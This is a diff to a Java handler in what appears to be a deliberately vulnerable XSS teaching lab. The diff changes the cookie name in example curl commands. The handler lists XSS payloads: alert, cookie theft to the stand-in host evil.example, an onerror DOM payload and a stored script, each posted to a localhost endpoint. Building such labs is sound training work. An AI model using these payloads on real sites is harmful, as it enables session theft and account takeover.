@@ -91,16 +91,16 @@ public class XssHandler implements IRouteHandler {
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"Basic alert", "<script>alert('XSS')</script>",
              "Classic proof-of-concept — pops an alert box in the victim's browser.", "comment",
-             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>alert('XSS')</script>\""},
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>alert('XSS')</script>\""},
             {"Cookie theft", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>",
              "Exfiltrates the session cookie to an attacker-controlled server.", "comment",
-             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>document.location='http://evil.example/steal?c='+document.cookie</script>\""},
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>document.location='http://evil.example/steal?c='+document.cookie</script>\""},
             {"DOM manipulation", "<img src=x onerror=\"document.body.style.background='red'\">",
              "Uses an invalid src to trigger onerror, then alters the page DOM.", "comment",
-             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'comment=<img src=x onerror=alert(1)>'"},
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'comment=<img src=x onerror=alert(1)>'"},
             {"Stored payload", "<script>document.title='Hacked by XSS'</script>",
              "Runs as the victim and changes the tab title. A stored script can do anything the user can do. The session stays alive.", "comment",
-             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>document.title='Hacked by XSS'</script>\""},
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>document.title='Hacked by XSS'</script>\""},
         });
 
         String content = TemplateEngine.vulnerabilityBadge(Messages.get("xss.badge.id"), Messages.get("xss.badge.name"), Messages.get("xss.badge.tag")) + info + exploits + panels;
